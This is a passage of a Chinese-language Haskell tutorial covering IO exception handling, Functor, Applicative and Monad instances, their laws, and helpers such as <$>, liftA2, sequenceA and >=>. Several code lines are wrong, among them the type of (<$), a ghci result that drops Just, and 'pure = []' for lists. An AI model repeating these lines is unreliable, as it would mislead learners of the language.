      也可以利用守卫（guard）语法和 ``System.IO.Error`` 中的函数来判断IO异常的类型来进行不同操作：

      .. container:: float highlight haskell
      ::

         import System.Environment
         import System.IO.Error
         import Control.Exception
           
         main = toTry `catch` handler
                       
         toTry :: IO ()  
         toTry = do (fileName:_) <- getArgs  
                    contents <- readFile fileName  
                    putStrLn $ "The file has " ++ show (length (lines contents)) ++ " lines!"  
           
         handler :: IOError -> IO ()  
         handler e  
             | isDoesNotExistError e = putStrLn "The file doesn't exist!"  
             | otherwise = ioError e  

      具体相关全部函数见文档： `System.IO.Error <https://hackage.haskell.org/package/base-4.15.0.0/docs/System-IO-Error.html>`__ 、 `Control.Exception <https://hackage.haskell.org/package/base-4.15.0.0/docs/Control-Exception-Base.html>`__


   .. rubric:: ` <#Functors>`__ Functors
      :name: Functors

      函子（Functor）是一个类型类（typeclass），和其他类型类一样，它规定了其实例类必须实现的功能（例如Eq类型类规定了它的实例必须是可以比较是否相等的），Functor规定类它的实例必须是可以进行映射的。Functor要求使用 ``fmap``
      :: (a -> b) -> f a -> f b
      函数来实现这个功能，它接收一个a ->
      b类型的函数、一个内部元素为a类型的函子，返回一个内部元素为b类型的函子

      Functor可以比作盒子，那fmap函数就相当于给定一个函数和一个盒子，将盒子中的全部元素都应用这个函数，再返回应用函数后的盒子

      函子的实例必须是一个Kind为\* ->
      \*的类型构造器，因为它要求其是一个盒子，盒子在接收内容后才会成为一个具体的类型。fmap中的 ``f a`` 和 ``f b`` 也是因为 ``f`` 是一个类型构造器，在接收类型a/b后才会变成一个具体类型（f
      a和f b）出现在函数类型声明中

      Functor的定义是:

      .. container:: float highlight haskell
      ::

         class Functor f where
             fmap :: (a -> b) -> f a -> f b
             (<$) :: a -> f a -> f b
             (<$) = fmap . const

      可以发现Functor不仅需要fmap函数，还需要一个<$函数，它接收一个a类型的变量和一个内容为b类型的函子，返回一个内容为a类型的函子；作用就是将传入的函子中的所有元素都替换为传入的第一个参数，比如：

      .. container:: float highlight haskell
      ::

         ghci> 'a' <$ [1, 2, 3]
         "aaa"

      但它不是声明一个函子实例必须的，因为它可以使用fmap和const函数复合来实现，其中const的类型签名：

      const :: a -> b -> a

      即接收两个参数，但始终只返回第一个参数

      .. rubric:: ` <#Functor实例>`__ Functor实例
         :name: Functor实例

      .. rubric:: ` <#>`__ []
         :name: section

      列表[]是一个函子，它通过map函数来实现fmap的功能：

      .. container:: float highlight haskell
      ::

         instance Functor [] where
             fmap = map

      map :: (a -> b) -> [a] -> [b]

      map和fmap要求的相同，达成的目的也一致。map接收一个函数和一个列表，它会将列表中的所有元素都应用这个函数后再返回这个列表

      .. rubric:: ` <#Maybe>`__ Maybe
         :name: Maybe

      Maybe也具有kind \* -> \*，它也是一个函子：

      .. container:: float highlight haskell
      ::

         instance Functor Maybe where
             fmap f Nothing = Nothing
             fmap f (Just x) = Just (f x)

         ghci> fmap (*2) Nothing
         Nothing
         ghci> fmap (*2) (Just 2)
         Just 4

      .. rubric:: ` <#Either-a>`__ Either a
         :name: Either-a

      Either的kind是\* -> \* ->
      \*，显然它不是函子，但是固定了一个传入类型的Either
      a的kind是\* -> \*，也是一个函子：

      .. container:: float highlight haskell
      ::

         instance Functor (Either a) where
             fmap f (Left x) = Left x
             fmap f (Right x) = Right (f x)

         ghci> fmap (*2) (Left 4)
         Left 4
         ghci> fmap (*2) (Right 4)
         Right 8

      因为使用Either时一般用右值表示正常结果，左值表示异常信息，所以使用fmap时只对右值进行操作，如果时左值则保持不变（而且左值此时也作为确定类型确定值存在）

      .. rubric:: ` <#IO>`__ IO
         :name: IO

      IO也是一个函子，使用fmap对IO中内容应用函数：

      .. container:: float highlight haskell
      ::

         instance Functor IO where
             fmap f action = do
                 result <- action
                 return (f result)

         ghci> fmap ("input: "++) getLine
         test
         "input: test"

      .. rubric:: ` <#a>`__ (,) a
         :name: a

      (,)表示一个二元组的类型构造器，(,) :: \* -> \* ->
      \*，而确定了第一个元素的类型后就变成了(,)
      a，它的kind是\* ->
      \*。也是一个函子，进行fmap函数时只对第二个元素应用：

      .. container:: float highlight haskell
      ::

         instance Functor ((,) a) where
             fmap f (x, y) = (x, f y)

      只剩一个元素的三元组和四元组也都是函子，fmap也只对最后一个元素应用：

      .. container:: float highlight haskell
      ::

         instance Functor ((,,) a b) where
             fmap f (a, b, c) = (a, b, f c)

         instance Functor ((,,,) a b c) where
             fmap f (a, b, c, d) = (a, b, c, f d)

      .. rubric:: ` <#gt-r>`__ (->) r
         :name: gt-r

      ->也是一个类型构造器，它的kind：

      (->) :: \* -> \* -> \*

      一个映射（一元函数）的类型a -> b也可以写成(->) a
      b，它是由类型a和类型b输入到类型构造器->中后形成的一个具体类型。所以确定了输入类型后的一元函数的类型就是(->)
      r（其中 ``r`` 是输入的类型）

      规定的fmap的类型签名是：

      fmap :: (a -> b) -> f a -> f b

      其中的f是函子，而在这个实例中(->)
      r就是函子，将其带入f可以得到：

      fmap :: (a -> b) -> ((-> r) a) -> ((-> r) b)

      把其中的(->)换成中缀可以得到：

      fmap :: (a -> b) -> (r -> a) -> (r -> b)

      | 传入两个函数，一个类型为a -> b，一个类型为r ->
        a，返回一个函数，类型为r -> b。
      | 不难推测这个fmap是将这两个函数复合了，先对输入对r应用第二个函数产生类型a的结果，然后在应用第一个函数产生类型b的结果，所以(->)
        r定义的fmap是：

      .. container:: float highlight haskell
      ::

         instance Functor ((->) r) where
             fmap f g = (\x -> f (g x))

      所以(->) r的fmap其实就是函数复合(.)：

      .. container:: float highlight haskell
      ::

         instance Functor ((->) r) where
             fmap = (.)

      .. container:: float highlight haskell
      ::

         ghci> :t fmap (*3) (+100)  
         fmap (*3) (+100) :: (Num a) => a -> a  
         ghci> fmap (*3) (+100) 1  
         303  
         ghci> (*3) `fmap` (+100) $ 1  
         303  
         ghci> (*3) . (+100) $ 1  
         303

      .. rubric:: ` <#Functor-Laws>`__ Functor Laws
         :name: Functor-Laws

      所有的函子都应该满足两个定律。这两个定律不是Haskell强制要求的，但应该确保一个函子满足这两个定律：

      #. ``fmap id = id`` （其中id为函数 ``(\x -> x)`` ）：即对一个函子fmap
         id，那它应该返回本身（fmap id a = id a =
         a，a为一个函子），比如：

         .. container:: float highlight haskell
         ::

            ghci> fmap id [1, 2, 3]
            [1,2,3]
            ghci> fmap id (Just 2)
            Just 2

      #. ``fmap (f . g) = fmap f . fmap g`` ：即函子的fmap支持结合律
         fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap
         g a)，其中 ``a`` 为一个函子
         fmap (f . g) (Just x) = fmap f (fmap g (Just x)) =
         fmap f (Just (g x)) = Just (f (g x))

         .. container:: float highlight haskell
         ::

            ghci> fmap ((*3) . (+100)) (Just 1)
            Just 303

      满足第一个定律的函子一定满足第二个定律，所以只要检查函子是否满足第一个定律即可

      .. rubric:: ` <#Intuition>`__ Intuition
         :name: Intuition

      对于函子和fmap，有两种理解方法

      #. 函子是一种容器（container）；fmap接收一个函数和一个容器，在容器内部应用这个函数，返回应用后的新容器

      #. 函子是一种计算上下文（context）；fmap是柯里化的，把其类型签名看作

         fmap :: (a -> b) -> (f a -> f b)

         接收一个函数返回另一个函数，传入函数g :: a ->
         b，fmap将其转换为新的函数

         fmap g :: f a -> f b

         使普通的函数g可以在计算上下文 ``f`` 中使用，这种转换也被称为提升（lift）

      .. rubric:: ` <#常用函数>`__ 常用函数
         :name: 常用函数

      .. rubric:: ` <#lt-gt>`__ <$>
         :name: lt-gt

      ``<$>`` 函数是 ``fmap`` 的中缀形式（它看着类似 ``$`` ， ``f $ 3`` 将f应用在单个值3上，而 ``f <$> [1, 2, 3]`` 将f应用在一个函子上，也就是应用在一个函子内部的所有值上）：

      .. container:: float highlight haskell
      ::

         ghci> fmap (*2) (Just 2)
         4
         ghci> (*2) <$> Just 2
         4

      .. rubric:: ` <#gt>`__ $>
         :name: gt

      ``$>`` 函数包含在 ``Data.Functor`` 模块中

      ($>) :: Functor f => f a -> b -> f b

      Functor定义时要求了 ``<$`` 函数，将函子内部的元素全部替换为指定的某个值，而 ``$>`` 正好将 ``<$`` 函数的两个参数反了过来，相当于 ``flip (<$)`` ：

      .. container:: float highlight haskell
      ::

         ghci> 'a' <$ [1, 2, 3]
         "aaa"
         ghci> [1, 2, 3] $> 'a'
         "aaa"

      .. rubric:: ` <#void>`__ void
         :name: void

      ``void`` 函数也包含在 ``Data.Functor`` 模块中

      void :: Functor f => f a -> f ()

      void函数把一个函子内部的全部元素都变成空（ ``()`` ）， ``void x`` 相当于 ``() <$ x`` ：

      .. container:: float highlight haskell
      ::

         ghci> void [1, 2, 3]
         [(), (), ()]
         ghci> void (Just 2)
         Just ()


   .. rubric:: ` <#Applicative-Functor>`__ Applicative
      Functor
      :name: Applicative-Functor

      应用函子（Applicative
      Functor）是函子的升级版，它包含在 ``Control.Applicative`` 模块中。

      fmap进行的操作是将一个普通一元函数应用在一个函子内部。而如果要将一个包含函数的函子应用在另一个函子上，fmap就处理不了了，但是应用函子的方法可以处理。应用函子的定义：

      .. container:: float highlight haskell
      ::

         class Functor f => Applicative f where
             pure :: a -> f a
             (<*>) :: f (a -> b) -> f a -> f b

      应用函子要求实现两个函数：

      -  ``pure`` :: a -> f
         a，不难理解，pure接收一个值，并将其放在默认的上下文/容器中。对于列表，pure
         = []；对于Maybe，pure = Just
      -  ``<*>`` :: f (a -> b) -> f a -> f b，类似于fmap ::
         (a -> b) -> f a -> f
         b，但不同的是<\*>的第一个参数的类型是f (a ->
         b)不是a ->
         b。所以<\*>的第一个参数是在上下文中的函数，而不是一个普通函数。换句话说，<\*>接收一个装有函数的函子和另一个函子，应用函数后返回新的函子。

      .. rubric:: ` <#Applicative-Functor实例>`__ Applicative
         Functor实例
         :name: Applicative-Functor实例

      .. rubric:: ` <#Maybe-1>`__ Maybe
         :name: Maybe-1

      Maybe是一个应用函子：

      .. container:: float highlight haskell
      ::

         instance Applicative Maybe where
             pure = Just
             Nothing <*> _ = Nothing
             (Just f) <*> something = fmap f something

      -  ``pure`` 函数：将一个值放在默认的上下文中，而对于Maybe，默认的上下文就是Just，所以pure
         x = Just x
      -  ``<*>`` 函数：将装有函数的函子中的函数应用另一个函子中

         -  第一个参数是Nothing，即第一个函子不包含函数，那返回的结果就也会是Nothing
         -  第一个参数是装有函数f的函子Just
            f，将其中的函数f应用在函子something中，只需要将f提取出来使用fmap应用在函子something中即可

      实际应用的例子：

      .. container:: float highlight haskell
      ::

         ghci> Just (+3) <*> Just 9
         Just 12
         ghci> pure (+3) <*> Just 9
         Just 12
         ghci> (+3) <$> Just 9
         Just 12
         ghci> Nothing <*> Just 9
         Nothing

      第一个例子，Just
      (+3)是一个包含函数(+3)的函子，将其应用在函子Just
      9中，将Just (+3)中的函数(+3)提取出来，应用在Just
      9中，得到了Just 12

      第二个例子，可以发现，在这里pure (+3)和Just
      (+3)等效，因为pure将函数(+3)放在默认上下文中，也就是Just中了

      而<\*>能做的不止这些，他可以连续传入更多函子作为参数，比如：

      .. container:: float highlight haskell
      ::

         ghci> pure (+) <*> Just 3 <*> Just 9
         Just 12
         ghci> pure (\x y z -> x + y + z) <*> Just 3 <*> Just 4 <*> Just 5
         Just 12

      <\*>函数一样是默认左结合的，pure (+) <\*> Just 3 <\*>
      Just 9相当于(pure (+) <\*> Just 3) <\*> Just 9，而pure
      (+) <\*> Just 3将(+)应用在Just 3上，得到的就是Just
      (+3)一个包含函数的函子，又将其通过<\*>应用在了Just
      9上，得到了Just 12:

      .. container:: float highlight haskell
      ::

           pure (\x y z -> x + y + z) <*> Just 3 <*> Just 4 <*> Just 5
         = (pure (\x y z -> x + y + z) <*> Just 3) <*> Just 4 <*> Just 5
         = (Just (\y z -> 3 + y + z) <*> Just 4) <*> Just 5
         = Just (\z -> 3 + 4 + z) <*> Just 5 = Just (+7) <*> Just 5
         = Just 12

      所以可以使用类似 pure f <\*> x <\*> y <\*>
      …来将一个普通多元函数f应用在多个函子上。

      而且pure f <\*>
      x实际上先将普通函数f放在上下文中，然后执行<\*>时再将其提取出来执行fmap，所以它就相当于将普通函数应用在函子x上，即fmap
      f x，也可以写成f <$> x。所以常用的写法就是：

      f <$> x <\*> y <\*> ...

      .. rubric:: ` <#-1>`__ []
         :name: -1

      列表也是一个应用函子：

      .. container:: float highlight haskell
      ::

         instance Applicative [] where
             pure x = [x]
             fs <*> xs = [f x | f <- fs, x <- xs]

      -  ``pure`` 函数：对于列表而言，一个值的最小上下文就是只包含这个值的列表[x]
      -  ``<*>`` 函数：列表的<\*>函数是通过列表推导来实现的。因为不同于Maybe的Just只包含一个值，列表可以包含很多值，第一个传入的列表中可能会包含很多函数，第二个传入的列表也会包含很多值，所以就需要先从第一个列表中取出一个函数然后依次应用在第二个列表的每个值中，再取出第一个列表中的第二个函数应用在第二个列表的每个值中……最终返回得到的所有结果的列表

      使用例子：

      .. container:: float highlight haskell
      ::

         ghci> [(+3), (*2)] <*> [1, 2]
         [4,5,2,4]
         ghci> [(+), (*)]  <*>  [1, 2]  <*>  [3, 4]  
         [4, 5, 5, 6, 3, 4, 6, 8]

      .. rubric:: ` <#IO-1>`__ IO
         :name: IO-1

      .. container:: float highlight haskell
      ::

         instance Applicative IO where
             pure = return
             a <*> b = do
                 f <- a
                 x <- b
                 return (f x)

      也不难理解，pure函数直接将传入的值return，相当于放在了IO的上下文中。而<\*>函数先将两个IO中内容提取出来，然后应用函数后return，形成新的IO函子

      .. container:: float highlight haskell
      ::

         ghci> (++) <$> getLine <*> getLine
         Line1
         Line2
         "Line1Line2"

      .. rubric:: ` <#gt-r-1>`__ (->) r
         :name: gt-r-1

      (->)
      r同样也是一个应用函子，和函子的分析一样，先来分析它的<\*>函数的类型签名：

      <\*> :: f (a -> b) -> f a -> f b

      其中f为(->) r，将其代入并替换为中缀：

      <\*> :: (r -> a -> b) -> (r -> a) -> (r -> b)

      可以看出它接收两个函数f :: r -> a -> b、g :: r ->
      a，返回另一个函数h :: (r -> b)

      那么返回的函数的输入为r，输出为b，所以先对输入应用函数g得到a，然后在对r和a应用f得到b，所以推测<\*>函数的操作就是：

      \\x -> f x (g x)

      于是：

      .. container:: float highlight haskell
      ::

         instance Applicative ((->) r) where
             pure x = (\_ -> x)
             f <*> g = \x -> f x (g x)

      将一个值放在函数的上下文中，最小上下文就应该返回这个值本身，所以pure函数定义为(\_
      -> x)，即无论输入什么，都返回x

      应用函子的<\*>函数接收两个函子，返回一个新的函子。对于(->)
      r，它接收两个函数，返回一个新的函数。具体例子：

      .. container:: float highlight haskell
      ::

         ghci> (+) <$> (+3) <*> (*100) $ 5
         508

      执行这句时发生了什么？：

      .. container:: float highlight haskell
      ::

           (+) <$> (+3) <*> (*100) $ 5
         = ((+) <$> (+3)) <*> (*100) $ 5
         = ((+) . (+3)) <*> (*100) $ 5 = (\a -> (+) ((+3) a)) <*> (*100) $ 5
         = (\a b -> (a + 3 + b)) <*> (*100) $ 5
         = (\x -> x + 3 + ((*100) x)) $ 5
         = (\x -> x + 3 + x * 100) $ 5
         = 5 + 3 + 5 * 100 = 508
         = (5 + 3) + (5 * 100)

      所以就相当于先对输入分别执行(+3)和(\*100)，然后将两个结果执行了(+)

      同样：

      .. container:: float highlight haskell
      ::

         ghci> (\x y z -> [x,y,z]) <$> (+3) <*> (*2) <*> (/2) $ 5  
         [8.0,10.0,2.5]  

      先对5分别执行(+3)、(\*2)、(/2)，然后将得到的三个结果传入(\\x
      y z -> [x,y,z])得到了最终的结果

      .. container:: float highlight haskell
      ::

           f <$> g <*> h <*> i
         = (\x -> f (g x) (h x) (i x))

      .. rubric:: ` <#ZipList>`__ ZipList
         :name: ZipList

      普通列表实现的<\*>函数是将每个函数应用在所有值上，但还有一种实现方法是将每个函数应用在对应值上，因为同一个类型不能存在同一函数的两种实现形式，所以引入了一个新的列表ZipList，包含在 ``Control.Applicative`` 模块中

      .. container:: float highlight haskell
      ::

         instance Applicative ZipList where
             pure x = ZipList (repeat x)
             ZipList fs <*> ZipList xs = ZipList (zipWith ($) fs xs)

      但是ZipList并不是Show的实例，所以不能直接显示出来，要使用 ``getZipList`` 来获取它内部的列表：

      .. container:: float highlight haskell
      ::

         ghci> getZipList $ (+) <$> ZipList [1,2,3] <*> ZipList [100,100..]  
         [101,102,103]
         ghci> getZipList $ (,,) <$> ZipList "dog" <*> ZipList "cat" <*> ZipList "rat"  
         [('d','c','r'),('o','a','a'),('g','t','t')]  

      .. rubric:: ` <#Applicative-Functor-Laws>`__ Applicative
         Functor Laws
         :name: Applicative-Functor-Laws

      应用函子一般有四个定律，都是保证pure的正确性的：

      #. ``Identity law`` ：pure id <\*> v = v
      #. ``Homomorphism`` ：pure f <\*> pure x = pure (f x)
      #. ``Interchange`` ：u <\*> pure v = pure ($ v) <\*>
         u
      #. ``Composition`` ：u <\*> (v <\*> w) = pure (.)
         <\*> u <\*> v <\*> w

      .. rubric:: ` <#Intuition-1>`__ Intuition
         :name: Intuition-1

      | 理解应用函子的方式也是将其看作是计算上下文（context），比如要计算：
      | $$
      | [[  g x_1 x_2 \\cdots x_n  ]]
      | $$

      其中$x_i$的类型是$f\\
      t_i$，𝑓 是应用函子（看作上下文）。而函数$g$的类型是：

      | $$
      | t_1\\to t_2\\to\\cdots\\to t_n\\to t
      | $$

      所以双括号（idiom
      brackets）的作用是将一个普通函数应用在包含在上下文中的参数上。$g\\
      x_1$可以通过fmap来执行，将$g$提升（lift）到$x_1$的上下文中，然后应用在$x_1$上。但是fmap返回的结果是一个函子，换句话说，$g\\
      x_1$结果的类型是：

      | $$
      | f  (t_2\\to t_3\\to\\cdots\\to t_n\\to t)
      | $$

      但是fmap并不能将上下文中的函数应用在上下文中的参数上，于是应用函子的<\*>函数提供了这个方法，所以计算$[[\\
      g x_1 x_2 \\cdots x_n ]]$，只需要：

      g <$> x1 <\*> x2 <\*> ... <\*> xn

      而pure函数的作用就是将一个不在上下文中的值（函数或参数）提升到上下文中，但不进行其他操作。比如参数$x_2$如果不在上下文中，需要用pure提升到上下文中才能按上面计算：

      g <$> x1 <\*> pure x2 <\*> ... <\*> xn

      .. rubric:: ` <#常用函数-1>`__ 常用函数
         :name: 常用函数-1

      .. rubric:: ` <#liftA-amp-liftA2-amp-liftA3>`__ liftA
         & liftA2 & liftA3
         :name: liftA-amp-liftA2-amp-liftA3

      liftA :: Applicative f => (a -> b) -> f a -> f b

      liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b
      -> f c

      liftA3 :: Applicative f => (a -> b -> c -> d) -> f a
      -> f b -> f c -> f d

      不难推测liftA就是fmap， ``liftA2 f x1 x2`` 相当于 ``f <$> x1 <*> x2`` ， ``liftA3 f x1 x2 x3`` 相当于 ``f <$> x1 <*> x2 <*> x3``

      .. rubric:: ` <#lt-amp-gt>`__ <\* & \*>
         :name: lt-amp-gt

      类型类似函子的 ``<$`` 和 ``$>`` ：

      (<\*) :: Applicative f => f a -> f b -> f a

      (\*>) :: Applicative f => f a -> f b -> f b

      <\*接收两个函子，如果两个函子中又一个为空，就返回空，否则返回的类型与第一个函子相同。\*>反过来

      .. container:: float highlight haskell
      ::

         ghci> Just 3 <* Just 4
         Just 3
         ghci> Just 3 *> Just 4
         Just 4
         ghci> Nothing <* Just 3
         Nothing
         ghci> Nothing *> Just 3
         Nothing
         ghci> [1, 2, 3] <* [3, 4]
         [1,1,2,2,3,3]
         ghci> [1, 2, 3] *> [3, 4]
         [3,4,3,4,3,4]
         ghci> [] <* [1, 2, 3]
         []
         ghci> [] *> [1, 2, 3]
         []

      .. rubric:: ` <#lt-gt-1>`__ <\*\*>
         :name: lt-gt-1

      (\*\*) :: Applicative f => f a -> f (a -> b) -> f b

      接收的参数是<\*>反转过来的，即先接收一个参数函子，然后接收一个函数函子，在将其应用返回。但是和flip(<\*>)不同，它先取参数函子的每个参数，然后再取函数函子中的函数逐个应用：

      .. container:: float highlight haskell
      ::

         ghci> [(+1), (+2), (+3)] <*> [1, 2]
         [2,3,3,4,4,5]
         ghci> [1, 2] <**> [(+1), (+2), (+3)]
         [2,3,4,3,4,5]
         ghci> flip(<*>) [1, 2] [(+1), (+2), (+3)]
         [2,3,3,4,4,5]

      .. rubric:: ` <#when-amp-unless>`__ when & unless
         :name: when-amp-unless

      when :: Applicative f => Bool -> f () -> f ()

      传入的第一个是一个结果为Bool类型的测试，如果测试为True，则调用第二个参数，否则返回pure
      ()。（when函数在上文IO操作中使用过）

      unless则与when相反，测试为True返回pure ()

      .. rubric:: ` <#sequenceA>`__ sequenceA
         :name: sequenceA

      sequenceA :: (Traversable t, Applicative f) => t (f a)
      -> f (t a)

      应用在列表上时，它的类型相当于：

      [f a] -> f [a]

      所以在列表上它的使用方法：

      .. container:: float highlight haskell
      ::

         ghci> sequenceA [Just 3, Just 2, Just 1]  
         Just [3,2,1]  
         ghci> sequenceA [Just 3, Nothing, Just 1]  
         Nothing  
         ghci> sequenceA [(+3),(+2),(+1)] 3  
         [6,5,4]  
         ghci> sequenceA [[1,2,3],[4,5,6]]  
         [[1,4],[1,5],[1,6],[2,4],[2,5],[2,6],[3,4],[3,5],[3,6]]  
         ghci> sequenceA [[1,2,3],[4,5,6],[3,4,4],[]]  
         []  

      它在对同一个参数应用不同函数时很有用：

      .. container:: float highlight haskell
      ::

         ghci> map (\f -> f 7) [(>4), (<10), odd]  
         [True,True,True]  
         ghci> sequenceA [(>4), (<10), odd] 7  
         [True,True,True]  


   .. rubric:: ` <#Monad>`__ Monad
      :name: Monad

      单子（Monad）是对 Applicative Functor 的扩展（但是诞生比Applicative早），
      Functor 的 ``<$>`` 函数实现了将普通函数应用在上下文值上，Applicative 的 ``<*>`` 
      函数将上下文中函数应用在上下文值上。Monad 提供了一个函数 ``>>=`` （bind），
      将一个接收普通值返回上下文值的函数应用在上下文值上：

      .. container:: float highlight haskell
      ::

         class Applicative m => Monad m where
             (>>=) :: m a -> (a -> m b) -> m b
             (>>) :: m a -> m b -> m b
             return :: a -> m a
             m >> n = m >>= \_ -> n
             return = pure

      -  ``return`` 函数：和 ``pure`` 一样，只是有另一个名字
      -  ``>>`` 函数：提供了默认的实现方法，它的作用和 Applicative 的 \*> 函数一样
      -  ``>>=`` 函数（bind）：比 Applicative 升级的函数，第一个参数是一个单子，第二个参数是一个接收值返回单子的函数，将这个函数应用在第一个参数单子中的值上，并返回得到的新单子

      .. rubric:: ` <#Monad实例>`__ Monad实例
         :name: Monad实例

      .. rubric:: ` <#Maybe-2>`__ Maybe
         :name: Maybe-2

      Maybe是一个单子实例，Applicative已经为它实现了return，因此只需要>>=函数：

      .. container:: float highlight haskell
      ::

         instance Monad Maybe where
             (Just x) >>= f = f x 
             Nothing  >>= _ = Nothing

      根据定义就很容易实现Maybe的>>=函数了，而且也很好理解

      .. container:: float highlight haskell
      ::

         ghci> Just 1 >>= \x -> Just (x + 1)
         Just 2
         ghci> Just 1 >>= \x -> return (x + 1)
         Just 2
         ghci> Nothing >>= \x -> Just (x + 1)
         Nothing
         ghci> Just 1 >>= \x -> Just (x + 1) >> Nothing >>= \y -> Just (y + 1)
         Nothing

      最后一个例子中出现了 >>
      Nothing，这时 Nothing 前的部分全都相当于没用，因为 >> 操作符的左右两边只要有一个出现 Nothing，那整体就会是 Nothing。这个特性可以用于在中途随时判断失误，只要有一处失误，结果就会是 Nothing

      .. rubric:: ` <#-2>`__ []
         :name: -2

      列表也是一个单子：

      .. container:: float highlight haskell
      ::

         instance Monad [] where
             xs >>= f = concat (map f xs)

      将这个函数应用在xs的每个值上，将返回的所有列表平铺成一个列表：

      .. container:: float highlight haskell
      ::

         ghci> [3,4,5] >>= \x -> [x,-x]  
         [3,-3,4,-4,5,-5]  
         ghci> [1,2] >>= \n -> ['a','b'] >>= \ch -> return (n,ch)  
         [(1,'a'),(1,'b'),(2,'a'),(2,'b')]  

      .. rubric:: ` <#IO-2>`__ IO
         :name: IO-2

      IO也是一个单子，但是实现方法比较深奥（逃

      .. rubric:: ` <#gt-r-2>`__ (->) r
         :name: gt-r-2

      (->)
      r也是一个单子，和Functor、Applicative一样，先分析它的>>=类型签名：

      (>>=) :: (-> r) a -> (a -> (-> r) b) -> (-> r) b

      (>>=) :: (r -> a) -> (a -> r -> b) -> (r -> b)

      也可以看出来，它接收两个函数f :: r -> a、g :: a -> r
      -> b，然后返回一个新的函数h :: r -> b

      那么函数h接收一个类型为r的参数，返回一个类型为b的值。所以先对输入应用f得到类型为a的中间值，然后再将这个值和输入参数一起传入函数g得到结果。所以函数h的定义应该是：

      \\x -> g (f x) x

      .. container:: float highlight haskell
      ::

         instance Monad ((->) r) where
             f >>= g = \x -> g (f x) x

      .. container:: float highlight haskell
      ::

         ghci> (+3) >>= (+) $ 1
         5
         ghci> (+) <$> (+3) <*> id $ 1
         5

      .. rubric:: ` <#do-notation>`__ do-notation
         :name: do-notation

      Haskell 的 do 语句为链式的 >>= 应用提供了命令式（imperative style）的语法糖。
      比如 ``a >>= \x -> b >> c >>= \y -> d`` ：

      .. container:: float highlight haskell
      ::

         a >>= \x ->
         b >>
         c >>= \y ->
         d

      其中有abcd四个值，可以看出a中内容绑定到了x上，c中内容绑定到了y上。使用do语句来表示这个操作可以写成：

      .. container:: float highlight haskell
      ::

         do { x <- a 
            ;      b 
            ; y <- c 
            ;      d 
            }

      其中的大括号和分号可以省略不写（挤在一行时不能省略）。do语句也只是一个语法糖，它可以递归地转换成普通的Monad操作语句：

      -  ``do e`` ：e
      -  ``do { e; ... }`` ：e >> do { … }
      -  ``do { v <- e; ... }`` ：e >>= \\v -> do { … }
      -  ``do { let ...; ... }`` ：let … in do { … }

      .. rubric:: ` <#ApplicativeDo>`__ ApplicativeDo
         :name: ApplicativeDo

      比如如下一个do语句：

      .. container:: float highlight haskell
      ::

         do x <- a 
            y <- b 
            z <- c 
            return (f x y z)

      它可以转化成：

      a >>= \\x -> b >>= \\y -> c >>= \\z -> return (f x y
      z)

      但是经过观察可以发现，整个语句实际上将函数f应用在了三个上下文中的值上，所以仅用Applicative的<$>和<\*>完全可以实现：

      f <$> a <\*> b <\*> c

      而且在运行的时候Applicative的效率会比Monad高，所以Haskell会将do语句尽可能优先转换为Applicative的表示方法然后再计算

      .. rubric:: ` <#Monad-Laws>`__ Monad Laws
         :name: Monad-Laws

      #. ``Left identity`` ： return a >>= k ``=`` k a
      #. ``Right identity`` ：m >>= return ``=`` m
      #. ``Associativity`` ：(m >>= g) >>= h ``=`` m >>=
         (\\x -> g x >>= h)

      前两个定律很好理解：

      -  将a注入上下文之后绑定（bind）给函数k(:: a -> m
         a)，相当于直接将a直接传入函数k
      -  将已经包含在上下文中的值绑定给return函数，相当于保持不变

      第三个定律是结合律，把它写成更像结合律的表示方法是：

      (m >>= (\\x -> g x)) >>= h ``=`` m >>= (\\x -> g x >>=
      h)

      .. rubric:: ` <#组合运算符（-gt-gt-）形式>`__ 组合运算符（>=>）形式
         :name: 组合运算符（-gt-gt-）形式

      ``Control.Monad`` 模块中还定义了函数 ``>=>`` （Kleisli-composition
      operator）：

      .. container:: float highlight haskell
      ::

         infixr 1 >=>
         (>=>) :: Monad m => (a -> m b) -> (b -> m c) -> (a -> m c)
         f >=> g = \x -> f x >>= g

      使用>=>运算符可以将两个用于绑定的函数结合在一起。用它表示的Monad定律更加清晰直观：

      #. ``Left identity`` ：return >=> f ``=`` f
      #. ``Right identity`` ：f >=> return ``=`` f
      #. ``Associativity`` ：(f >=> g) >=> h ``=`` f >=> (g
         >=> h)

      .. rubric:: ` <#do-notation形式>`__ do-notation形式
         :name: do-notation形式

      Monad 的这三个定律还可以使用 do 语句来描述：

      #. ``Left identity`` ：

         .. container:: float highlight haskell
         ::

            do { x' <- return x;
                 f x'             =   do { f x } 
               }

      #. ``Right identity`` ：

         .. container:: float highlight haskell
         ::

            do { x <- m; 
                 return x         =   do { m }
               }

      #. ``Associativity`` ：

         .. container:: float highlight haskell
         ::

            do { y <- do { x <- m;       do { x <- m;              do { x <- m;
                           f x                do { y <- f x;            y <- f x;
                         }           =             g y         =        g y
                 g y                             }                    }
               }                            }

      .. rubric:: ` <#Intuition-2>`__ Intuition
         :name: Intuition-2

      Monad也可以很自然地看成Applicative的升级版，比如Applicative的操作全部是固定的，而Monad的操作可以在中途突然改变

      同时Monad也完成了Functor和Applicative无法完成的操作。比如要用fmap和实现>>=函数（即达成操作
      m a -> (a -> m b) -> m b），先假设 f :: a -> m
      b，那么fmap f的类型就会是 m a -> m (m b)，将m
      a应用在fmap f上会得到结果m (m b)，而不是m
      b。但是目前只可以使用pure将一个值装入上下文中（a -> m
      a），而没有一个函数可以从上下文中提取值（m a ->
      a）。那么就需要定义一个新的函数来实现这个操作的效果（m
      (m b) -> m b）。因此Monad的另一个等效的定义方法是：

      .. container:: float highlight haskell
      ::

         class Applicative m => Monad' m where
             join :: m (m a) -> m a 
             
             (>>=) :: m a -> (a -> m b) -> m b 
             x >>= f = join $ fmap f x

      但是定义>>=函数会更为直观方便，所以Haskell采用了用>>=函数定义Monad的方法

      同时Haskell还提供了join函数的定义：

      .. container:: float highlight haskell
      ::

         join :: Monad m => m (m a) -> m a 
         join x = x >>= id

      .. rubric:: ` <#常用函数-2>`__ 常用函数
         :name: 常用函数-2

      .. rubric:: ` <#liftM-amp-ap>`__ liftM & ap
         :name: liftM-amp-ap

      liftM :: Monad m => (a -> b) -> m a -> m b

      ap :: Monad m => m (a -> b) -> m a -> m b

      所以liftM其实就是fmap、ap就是<\*>，但是老版本的GHC定义Monad并没有Functor、Applicative的约束，所以实现了liftM、ap，并且保留了这个名字

      因此一个单子也可以通过 ``pure = return`` 、 ``(<*>) = ap`` 直接成为应用函子的实例

      .. rubric:: ` <#sequence-1>`__ sequence
         :name: sequence-1

